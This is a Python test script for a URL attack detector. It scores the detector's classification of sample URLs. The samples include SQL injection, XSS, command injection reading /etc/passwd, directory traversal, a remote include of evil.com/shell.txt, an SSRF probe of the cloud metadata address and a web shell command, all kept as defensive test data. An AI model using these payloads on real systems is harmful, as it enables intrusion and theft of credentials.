"""
Test the detection system
"""
import sys
from pathlib import Path

sys.path.append(str(Path(__file__).parent.parent))

from detection.detector import URLAttackDetector

def test_detector():
    """Test the detector with sample URLs"""
    detector = URLAttackDetector()
    
    test_urls = [
        # Benign
        ("http://example.com/products?category=electronics", "Benign"),
        ("http://site.com/index.html", "Benign"),
        
        # SQLi
        ("http://site.com/login?user=' OR '1'='1", "SQLi"),
        ("http://example.com/product?id=1' UNION SELECT * FROM users--", "SQLi"),
        
        # XSS
        ("http://site.com/search?q=<script>alert(1)</script>", "XSS"),
        ("http://example.com/comment?text=<img src=x onerror=alert(1)>", "XSS"),
        
        # CMD Injection
        ("http://site.com/exec?cmd=ls -la", "CMD Injection"),
        ("http://example.com/run?cmd=cat /etc/passwd", "CMD Injection"),
        
        # Directory Traversal
        ("http://site.com/file?path=../../../../etc/passwd", "Directory Traversal"),
        
        # LFI/RFI
        ("http://site.com/include?page=http://evil.com/shell.txt", "LFI/RFI"),
        
        # SSRF
        ("http://site.com/proxy?url=http://169.254.169.254/latest/meta-data", "SSRF"),
        
        # Web Shell
        ("http://site.com/uploads/shell.php?cmd=whoami", "Web Shell"),
    ]
    
    print("Testing URL Attack Detector")
    print("=" * 80)
    
    correct = 0
    total = len(test_urls)
    
    for url, expected in test_urls:
        result = detector.analyze_request(url)
        detected = result['attack_prediction']
        confidence = result['confidence']
        rule = result['rule_matched']
        
        is_correct = detected == expected
        if is_correct:
            correct += 1
        
        status = "✓" if is_correct else "✗"
        
        print(f"\n{status} URL: {url[:80]}")
        print(f"  Expected: {expected}")
        print(f"  Detected: {detected} (confidence: {confidence:.2%})")
        if rule:
            print(f"  Rule: {rule}")
    
    print("\n" + "=" * 80)
    print(f"Accuracy: {correct}/{total} ({correct/total*100:.1f}%)")
    print("=" * 80)

if __name__ == '__main__':
    test_detector()
